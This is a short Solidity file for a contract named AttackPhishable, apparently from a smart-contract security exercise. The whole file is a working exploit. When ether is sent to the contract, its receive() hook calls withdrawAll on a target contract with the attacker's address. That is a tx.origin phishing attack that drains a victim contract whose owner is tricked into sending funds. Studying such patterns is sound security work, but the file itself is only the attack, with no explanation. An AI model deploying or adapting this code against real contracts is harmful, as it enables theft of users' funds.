//SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract AttackPhishable {

    address public impl;
    address public owner;

    constructor( address _impl, address _owner) {
        impl = _impl;
        owner = _owner;
    }

    receive() external payable {
        (bool success, ) = impl.call(abi.encodeWithSignature("withdrawAll(address)", owner));
        require(success);
    }

}